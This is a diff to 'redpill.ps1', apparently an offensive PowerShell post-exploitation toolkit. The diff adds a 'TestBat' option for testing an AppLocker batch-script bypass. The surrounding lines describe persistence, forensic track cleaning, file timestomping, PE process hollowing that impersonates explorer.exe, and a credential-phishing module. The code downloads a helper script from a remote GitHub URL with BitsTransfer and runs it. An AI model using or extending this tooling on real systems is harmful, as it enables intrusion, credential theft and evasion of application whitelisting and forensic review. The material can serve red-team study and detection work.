@@ -162,7 +162,7 @@ $ListParameters = @"
   -Upload           script.ps1           Upload script.ps1 from attacker apache2 webroot
   -Persiste         `$Env:TMP\script.ps1  Persiste script.ps1 on every startup {BeaconHome}
   -CleanTracks      Clear|Paranoid       Clean disk artifacts left behind {clean system tracks}
-  -AppLocker        Enum|WhoAmi          Enumerate AppLocker Directorys with weak permissions
+  -AppLocker        Enum|WhoAmi|TestBat  Enumerate AppLocker Directorys with weak permissions
   -FileMace         `$Env:TMP\test.txt    Change File Mace {CreationTime,LastAccessTime,LastWriteTime}
   -MetaData         `$Env:TMP\test.exe    Display files \ applications description (metadata)
   -PEHollow         `$Env:TMP\test.exe    PE Process Hollowing {impersonate explorer.exe as parent}
@@ -1125,7 +1125,7 @@ If($PhishCreds -ieq "Start" -or $PhishCreds -ieq "Brute"){
 
    ## Check for file download integrity (fail/corrupted downloads)
    $CheckInt = Get-Content -Path "$Env:TMP\CredsPhish.ps1" -EA SilentlyContinue
-   $SizeDump = ((Get-Item -Path "$Env:TMP\CredsPhish.ps1" -EA SilentlyContinue).length/1KB) ## DefaultFileSize: 17,068359375/KB
+   $SizeDump = ((Get-Item -Path "$Env:TMP\CredsPhish.ps1" -EA SilentlyContinue).length/1KB) ## DefaultFileSize: 17,158203125/KB
    If(-not(Test-Path -Path "$Env:TMP\CredsPhish.ps1") -or $SizeDump -lt 17 -or $CheckInt -iMatch '^(<!DOCTYPE html)'){
       ## Fail to download CredsPhish.ps1 using BitsTransfer OR the downloaded file is corrupted
       Write-Host "[abort] fail to download CredsPhish.ps1 using BitsTransfer (BITS)" -ForeGroundColor Red -BackGroundColor Black
@@ -1936,7 +1936,7 @@ If($PEHollow -ne "false"){
    If(Test-Path -Path "$Env:TMP\Start-Hollow.ps1"){Remove-Item -Path "$Env:TMP\Start-Hollow.ps1" -Force}
 }
 
-if($AppLocker -ieq "Enum" -or $AppLocker -ieq "WhoAmi"){
+if($AppLocker -ieq "Enum" -or $AppLocker -ieq "WhoAmi" -or $AppLocker -ieq "TestBat"){
 
    <#
    .SYNOPSIS
@@ -1944,7 +1944,7 @@ if($AppLocker -ieq "Enum" -or $AppLocker -ieq "WhoAmi"){
       Helper - Enumerate directorys with weak permissions (bypass applocker)
 
    .Parameter AppLocker
-      Accepts arguments: Enum and WhoAmi
+      Accepts arguments: Enum, WhoAmi and TestBat
 
    .Parameter FolderRigths
       Accepts permissions: Modify, Write, FullControll
@@ -1955,6 +1955,10 @@ if($AppLocker -ieq "Enum" -or $AppLocker -ieq "WhoAmi"){
    .EXAMPLE
       PS C:\> Powershell -File redpill.ps1 -AppLocker WhoAmi
       Enumerate ALL Group Names available on local machine
+
+   .EXAMPLE
+      PS C:\> Powershell -File redpill.ps1 -AppLocker TestBat
+      Test for AppLocker Batch Script Execution Restriction bypass
 
    .EXAMPLE
       PS C:\> Powershell -File redpill.ps1 -AppLocker Enum -GroupName "BUILTIN\Users" -FolderRigths "Write"
@@ -1983,7 +1987,7 @@ if($AppLocker -ieq "Enum" -or $AppLocker -ieq "WhoAmi"){
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/AppLocker.ps1 -Destination $Env:TMP\AppLocker.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\AppLocker.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 8){## Corrupted download detected => DefaultFileSize: 8,23828125/KB
+      If($SizeDump -lt 13){## Corrupted download detected => DefaultFileSize: 13,5458984375/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\AppLocker.ps1"){Remove-Item -Path "$Env:TMP\AppLocker.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -1995,6 +1999,8 @@ if($AppLocker -ieq "Enum" -or $AppLocker -ieq "WhoAmi"){
        powershell -File "$Env:TMP\AppLocker.ps1" -WhoAmi Groups
    }ElseIf($AppLocker -ieq "Enum"){
        powershell -File "$Env:TMP\AppLocker.ps1" -GroupName "$GroupName" -FolderRigths "$FolderRigths"
+   }ElseIf($AppLocker -ieq "TestBat"){
+       powershell -File "$Env:TMP\AppLocker.ps1" -TestBat TestBypass
    }
 
    ## Clean Old files left behind
@@ -3342,7 +3348,7 @@ $HelpParameters = @"
       Helper - Enumerate directorys with weak permissions (bypass applocker)
 
    .Parameter AppLocker
-      Accepts arguments: Enum and WhoAmi
+      Accepts arguments: Enum, WhoAmi and TestBat
 
    .Parameter FolderRigths
       Accepts permissions: Modify, Write, FullControll
@@ -3353,6 +3359,10 @@ $HelpParameters = @"
    .EXAMPLE
       PS C:\> Powershell -File redpill.ps1 -AppLocker WhoAmi
       Enumerate ALL Group Names available on local machine
+
+   .EXAMPLE
+      PS C:\> Powershell -File redpill.ps1 -AppLocker TestBat
+      Test for AppLocker Batch Script Execution Restriction bypass
 
    .EXAMPLE
       PS C:\> Powershell -File redpill.ps1 -AppLocker Enum -GroupName "BUILTIN\Users" -FolderRigths "Write"
